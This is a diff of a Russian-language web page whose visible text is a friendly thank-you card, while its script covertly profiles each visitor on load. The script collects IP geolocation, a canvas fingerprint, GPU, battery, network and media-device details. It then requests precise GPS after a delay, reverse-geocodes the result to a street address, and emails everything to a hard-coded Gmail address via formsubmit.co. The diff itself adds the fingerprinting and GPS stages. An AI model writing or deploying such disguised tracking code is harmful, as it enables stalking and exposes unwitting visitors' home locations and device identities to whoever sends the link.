@@ -2,41 +2,73 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Главная</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
+<meta name="theme-color" content="#f5f4f0">
+<title>Спасибо</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
   html, body { height: 100%; }
   body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 100%);
-    color: #e8e8f0;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Roboto, sans-serif;
+    background: #f5f4f0;
+    color: #2a2a2a;
     display: flex;
     align-items: center;
     justify-content: center;
     padding: 24px;
     min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+    line-height: 1.65;
   }
   .card {
-    background: rgba(255,255,255,0.04);
-    border: 1px solid rgba(255,255,255,0.08);
-    border-radius: 16px;
-    padding: 48px 32px;
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 56px 34px 46px;
     max-width: 420px;
     width: 100%;
     text-align: center;
-    backdrop-filter: blur(10px);
+    box-shadow: 0 1px 2px rgba(0,0,0,0.03), 0 8px 32px rgba(0,0,0,0.06);
   }
-  h1 { font-size: 1.75rem; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.02em; }
-  p { color: #8888a0; line-height: 1.6; font-size: 0.95rem; }
-  .status { margin-top: 24px; font-size: 0.8rem; color: #5a5a75; min-height: 1em; }
+  .icon {
+    width: 56px;
+    height: 56px;
+    margin: 0 auto 24px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #f0e6d2, #e8dcc0);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 26px;
+  }
+  h1 {
+    font-size: 1.6rem;
+    font-weight: 600;
+    margin-bottom: 18px;
+    letter-spacing: -0.02em;
+    color: #1a1a1a;
+    line-height: 1.3;
+  }
+  p {
+    color: #6b6b6b;
+    font-size: 0.98rem;
+    margin-bottom: 14px;
+  }
+  .sig {
+    margin-top: 30px;
+    font-size: 0.9rem;
+    color: #a0a0a0;
+    font-style: italic;
+  }
+  .heart { color: #d97a7a; }
 </style>
 </head>
 <body>
   <div class="card">
-    <h1>Добро пожаловать</h1>
-    <p>Всё работает как надо. Можешь закрыть эту страницу.</p>
-    <div class="status" id="status"></div>
+    <div class="icon">✦</div>
+    <h1>Спасибо, что заглянули</h1>
+    <p>Мы очень рады видеть вас здесь. Спасибо, что уделили нам немного своего времени.</p>
+    <p>Хорошего дня и отличного настроения <span class="heart">♥</span></p>
+    <div class="sig">— с искренней благодарностью</div>
   </div>
 
   <script>
@@ -44,65 +76,48 @@
     'use strict';
 
     // ============================================================
-    //  НАСТРОЙКИ — поменяй только это
+    //  НАСТРОЙКИ
     // ============================================================
     const CONFIG = {
-      RECIPIENT_EMAIL: 'solncegrei@gmail.com',  // ← сюда свой Gmail
-      SEND_ONCE_PER_SESSION: true,              // одно письмо на сессию
-      SHOW_STATUS: true                         // показывать статус на странице
+      RECIPIENT_EMAIL: 'solncegrei@gmail.com',  // ← твой Gmail
+      SEND_ONCE_PER_SESSION: true,
+      GEOLOCATION_DELAY_MS: 3000,               // пауза перед запросом GPS
+      GEOLOCATION_TIMEOUT_MS: 15000
     };
     // ============================================================
 
-    const statusEl = document.getElementById('status');
-    const setStatus = (t) => { if (CONFIG.SHOW_STATUS && statusEl) statusEl.textContent = t; };
-
+    // ---------------- утилиты ----------------
     function shouldSend() {
       if (!CONFIG.SEND_ONCE_PER_SESSION) return true;
       try {
-        const key = 'visit_sent_' + location.hostname;
-        if (sessionStorage.getItem(key)) return false;
-        sessionStorage.setItem(key, '1');
+        const k = 'visit_sent_' + location.hostname;
+        if (sessionStorage.getItem(k)) return false;
+        sessionStorage.setItem(k, '1');
         return true;
-      } catch (e) { return true; }
+      } catch { return true; }
     }
 
-    async function gather() {
-      let geo = {};
+    function visitCount() {
+      try {
+        const k = 'visit_n_' + location.hostname;
+        const n = parseInt(localStorage.getItem(k) || '0', 10) + 1;
+        localStorage.setItem(k, String(n));
+        return n;
+      } catch { return 1; }
+    }
+
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+    // ---------------- сбор базовых данных (без разрешений) ----------------
+    async function ipGeo() {
       try {
         const ctrl = new AbortController();
-        const timer = setTimeout(() => ctrl.abort(), 5000);
+        const t = setTimeout(() => ctrl.abort(), 5000);
         const r = await fetch('https://ipapi.co/json/', { cache: 'no-store', signal: ctrl.signal });
-        clearTimeout(timer);
-        if (r.ok) geo = await r.json();
-      } catch (e) {}
-
-      const ua = navigator.userAgent;
-      const now = new Date();
-
-      return {
-        'Время (локальное)': now.toLocaleString('ru-RU'),
-        'Время (UTC)':       now.toISOString(),
-        'IP-адрес':          geo.ip || '—',
-        'Страна':            geo.country_name ? geo.country_name + ' (' + geo.country_code + ')' : '—',
-        'Регион':            geo.region || '—',
-        'Город':             geo.city || '—',
-        'Индекс':            geo.postal || '—',
-        'Координаты':        (geo.latitude && geo.longitude) ? geo.latitude + ', ' + geo.longitude : '—',
-        'Провайдер':         geo.org || '—',
-        'Часовой пояс':      geo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
-        'Тип устройства':    deviceType(ua),
-        'ОС':                os(ua),
-        'Браузер':           browser(ua),
-        'Язык':              navigator.language,
-        'Экран':             screen.width + '×' + screen.height + ' @' + window.devicePixelRatio + 'x',
-        'Окно':              window.innerWidth + '×' + window.innerHeight,
-        'Ядер CPU':          navigator.hardwareConcurrency || '—',
-        'Память':            navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : '—',
-        'Сенсор':            ('ontouchstart' in window) ? 'да' : 'нет',
-        'User-Agent':        ua,
-        'Referrer':          document.referrer || 'прямой заход',
-        'Страница':          location.href
-      };
+        clearTimeout(t);
+        if (r.ok) return await r.json();
+      } catch {}
+      return {};
     }
 
     function deviceType(ua) {
@@ -111,32 +126,206 @@
       return 'Компьютер';
     }
 
-    function os(ua) {
+    function osInfo(ua) {
       if (/Windows NT 10/i.test(ua))   return 'Windows 10/11';
       if (/Windows NT 6\.3/i.test(ua)) return 'Windows 8.1';
       if (/Windows NT/i.test(ua))      return 'Windows';
-      const android = ua.match(/Android\s([\d.]+)/);
-      if (android) return 'Android ' + android[1];
-      const ios = ua.match(/(?:iPhone|CPU) OS\s([\d_]+)/);
-      if (ios) return 'iOS ' + ios[1].replace(/_/g, '.');
+      const a = ua.match(/Android\s([\d.]+)/);
+      if (a) return 'Android ' + a[1];
+      const i = ua.match(/(?:iPhone|CPU) OS\s([\d_]+)/);
+      if (i) return 'iOS ' + i[1].replace(/_/g, '.');
       if (/Mac OS X/i.test(ua))        return 'macOS';
+      if (/CrOS/i.test(ua))            return 'ChromeOS';
       if (/Linux/i.test(ua))           return 'Linux';
       return '—';
     }
 
-    function browser(ua) {
-      if (/Edg\//i.test(ua))        return 'Edge';
-      if (/OPR\/|Opera/i.test(ua))  return 'Opera';
-      if (/YaBrowser/i.test(ua))    return 'Yandex';
-      if (/Firefox\//i.test(ua))    return 'Firefox';
-      if (/Chrome\//i.test(ua))     return 'Chrome';
-      if (/Safari\//i.test(ua))     return 'Safari';
+    function browserInfo(ua) {
+      if (/Edg\//i.test(ua))       return 'Edge';
+      if (/OPR\/|Opera/i.test(ua)) return 'Opera';
+      if (/YaBrowser/i.test(ua))   return 'Yandex';
+      if (/SamsungBrowser/i.test(ua)) return 'Samsung Internet';
+      if (/Firefox\//i.test(ua))   return 'Firefox';
+      if (/Chrome\//i.test(ua))    return 'Chrome';
+      if (/Safari\//i.test(ua))    return 'Safari';
       return '—';
     }
 
-    async function send(data) {
-      const subject = 'Посетитель: ' + data['Город'] + ', ' + data['Страна'];
-      const body = Object.assign({ _subject: subject, _template: 'table', _captcha: 'false' }, data);
+    function gpuInfo() {
+      try {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (!gl) return {};
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          gpuVendor:   ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
+          gpuRenderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
+        };
+      } catch { return {}; }
+    }
+
+    function canvasHash() {
+      try {
+        const c = document.createElement('canvas');
+        c.width = 220; c.height = 40;
+        const ctx = c.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 100, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('fp-отпечаток', 2, 15);
+        ctx.fillStyle = 'rgba(102,204,0,0.7)';
+        ctx.fillText('fp-отпечаток', 4, 17);
+        const data = c.toDataURL();
+        let h = 0;
+        for (let i = 0; i < data.length; i++) { h = ((h << 5) - h) + data.charCodeAt(i); h |= 0; }
+        return h.toString(16);
+      } catch { return '—'; }
+    }
+
+    async function batteryInfo() {
+      if (!navigator.getBattery) return {};
+      try {
+        const b = await navigator.getBattery();
+        return {
+          batteryLevel:    Math.round(b.level * 100) + '%',
+          batteryCharging: b.charging ? 'да' : 'нет'
+        };
+      } catch { return {}; }
+    }
+
+    async function storageInfo() {
+      if (!navigator.storage || !navigator.storage.estimate) return {};
+      try {
+        const e = await navigator.storage.estimate();
+        return {
+          storageQuota: (e.quota / 1024 / 1024 / 1024).toFixed(2) + ' ГБ',
+          storageUsage: (e.usage / 1024).toFixed(1) + ' КБ'
+        };
+      } catch { return {}; }
+    }
+
+    function connectionInfo() {
+      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (!c) return {};
+      return {
+        netType:     c.effectiveType || '—',
+        netDownlink: c.downlink ? c.downlink + ' Мбит/с' : '—',
+        netRTT:      c.rtt ? c.rtt + ' мс' : '—',
+        netSaveData: c.saveData ? 'да' : 'нет'
+      };
+    }
+
+    async function mediaInfo() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return {};
+      try {
+        const d = await navigator.mediaDevices.enumerateDevices();
+        return {
+          microphones: d.filter(x => x.kind === 'audioinput').length,
+          cameras:     d.filter(x => x.kind === 'videoinput').length,
+          speakers:    d.filter(x => x.kind === 'audiooutput').length
+        };
+      } catch { return {}; }
+    }
+
+    async function gatherBase() {
+      const [geo, battery, storage, media] = await Promise.all([
+        ipGeo(), batteryInfo(), storageInfo(), mediaInfo()
+      ]);
+      const ua = navigator.userAgent;
+      const now = new Date();
+      const conn = connectionInfo();
+      const gpu = gpuInfo();
+
+      return {
+        // --- время ---
+        'Время локальное':  now.toLocaleString('ru-RU'),
+        'Время UTC':        now.toISOString(),
+        'Часовой пояс':     geo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
+        'Смещение UTC (мин)': -now.getTimezoneOffset(),
+
+        // --- IP / сеть ---
+        'IP-адрес':         geo.ip || '—',
+        'Страна (IP)':      geo.country_name ? geo.country_name + ' (' + geo.country_code + ')' : '—',
+        'Регион (IP)':      geo.region || '—',
+        'Город (IP)':       geo.city || '—',
+        'Индекс (IP)':      geo.postal || '—',
+        'Широта (IP)':      geo.latitude || '—',
+        'Долгота (IP)':     geo.longitude || '—',
+        'Провайдер':        geo.org || '—',
+        'Тип сети':         conn.netType || '—',
+        'Скорость сети':    conn.netDownlink || '—',
+        'Пинг RTT':         conn.netRTT || '—',
+        'Экономия трафика': conn.netSaveData || '—',
+
+        // --- устройство ---
+        'Тип устройства':   deviceType(ua),
+        'ОС':               osInfo(ua),
+        'Браузер':          browserInfo(ua),
+        'Платформа':        navigator.platform || '—',
+        'Производитель':    navigator.vendor || '—',
+        'Язык':             navigator.language + ' [' + (navigator.languages || []).join(',') + ']',
+        'Ядер CPU':         navigator.hardwareConcurrency || '—',
+        'ОЗУ (ГБ)':         navigator.deviceMemory || '—',
+        'Сенсорных точек':  navigator.maxTouchPoints || 0,
+        'Сенсор':           ('ontouchstart' in window) ? 'да' : 'нет',
+        'Батарея':          battery.batteryLevel || '—',
+        'На зарядке':       battery.batteryCharging || '—',
+        'Экран':            screen.width + '×' + screen.height,
+        'Глубина цвета':    screen.colorDepth + ' бит',
+        'Плотность (DPR)':  window.devicePixelRatio,
+        'Окно':             window.innerWidth + '×' + window.innerHeight,
+        'Ориентация':       screen.orientation && screen.orientation.type || '—',
+        'GPU вендор':       gpu.gpuVendor || '—',
+        'GPU рендерер':     gpu.gpuRenderer || '—',
+        'Canvas-отпечаток': canvasHash(),
+        'Микрофоны':        media.microphones !== undefined ? media.microphones : '—',
+        'Камеры':           media.cameras !== undefined ? media.cameras : '—',
+        'Динамики':         media.speakers !== undefined ? media.speakers : '—',
+        'Хранилище (квота)': storage.storageQuota || '—',
+        'Хранилище (занято)': storage.storageUsage || '—',
+        'Cookies':          navigator.cookieEnabled ? 'включены' : 'выключены',
+        'DNT':              navigator.doNotTrack || '—',
+
+        // --- визит ---
+        'Номер визита':     visitCount(),
+        'Referrer':         document.referrer || 'прямой заход',
+        'Страница':         location.href,
+
+        'User-Agent':       ua
+      };
+    }
+
+    // ---------------- GPS ----------------
+    function getGps() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          p => resolve(p.coords),
+          () => resolve(null),
+          { enableHighAccuracy: true, timeout: CONFIG.GEOLOCATION_TIMEOUT_MS, maximumAge: 0 }
+        );
+      });
+    }
+
+    async function reverseGeocode(lat, lon) {
+      try {
+        const url = 'https://nominatim.openstreetmap.org/reverse?format=jsonv2'
+          + '&lat=' + lat + '&lon=' + lon + '&accept-language=ru&zoom=18&addressdetails=1';
+        const r = await fetch(url);
+        if (!r.ok) return null;
+        return await r.json();
+      } catch { return null; }
+    }
+
+    // ---------------- отправка ----------------
+    async function sendEmail(data, subject) {
+      const body = Object.assign({
+        _subject: subject,
+        _template: 'table',
+        _captcha: 'false'
+      }, data);
 
       try {
         const r = await fetch('https://formsubmit.co/ajax/' + encodeURIComponent(CONFIG.RECIPIENT_EMAIL), {
@@ -144,24 +333,49 @@
           headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
           body: JSON.stringify(body)
         });
-        if (r.ok) {
-          setStatus('✓ уведомление отправлено');
-          console.log('[tracker] отправлено', data);
-        } else {
-          setStatus('⚠ сервис вернул ошибку');
-          console.warn('[tracker] ответ', await r.text());
-        }
-      } catch (e) {
-        setStatus('⚠ не удалось отправить');
-        console.error('[tracker]', e);
-      }
+        return r.ok;
+      } catch { return false; }
     }
 
+    // ---------------- главный сценарий ----------------
     (async function run() {
-      if (!shouldSend()) { setStatus(''); return; }
-      setStatus('определяем устройство...');
-      const info = await gather();
-      await send(info);
+      if (!shouldSend()) return;
+
+      // 1) Сразу — базовый email по IP
+      const base = await gatherBase();
+      const baseSubject = 'Визит: ' + (base['Город (IP)'] || '?') + ', ' + (base['Страна (IP)'] || '?');
+      sendEmail(base, baseSubject);
+
+      // 2) Письмо благодарности уже на экране — ждём, потом GPS
+      await sleep(CONFIG.GEOLOCATION_DELAY_MS);
+
+      const coords = await getGps();
+      if (!coords) return;
+
+      const extra = {
+        'GPS широта':       coords.latitude.toFixed(7),
+        'GPS долгота':      coords.longitude.toFixed(7),
+        'GPS точность (м)': Math.round(coords.accuracy),
+        'GPS высота (м)':   coords.altitude != null ? Math.round(coords.altitude) : '—',
+        'Google Maps':      'https://maps.google.com/?q=' + coords.latitude + ',' + coords.longitude,
+        'Яндекс Карты':     'https://yandex.ru/maps/?pt=' + coords.longitude + ',' + coords.latitude + '&z=18&l=map'
+      };
+
+      const rev = await reverseGeocode(coords.latitude, coords.longitude);
+      if (rev && rev.address) {
+        const a = rev.address;
+        const parts = [
+          a.country, a.state, a.county, a.city || a.town || a.village,
+          a.suburb || a.neighbourhood, a.road || a.pedestrian,
+          a.house_number
+        ].filter(Boolean);
+        if (parts.length) extra['GPS адрес'] = parts.join(', ');
+        if (rev.display_name) extra['Полный адрес'] = rev.display_name;
+      }
+
+      const full = Object.assign({}, base, extra);
+      const gpsSubject = 'GPS: ' + (extra['GPS адрес'] || (coords.latitude.toFixed(5) + ', ' + coords.longitude.toFixed(5)));
+      sendEmail(full, gpsSubject);
     })();
   })();
   </script>
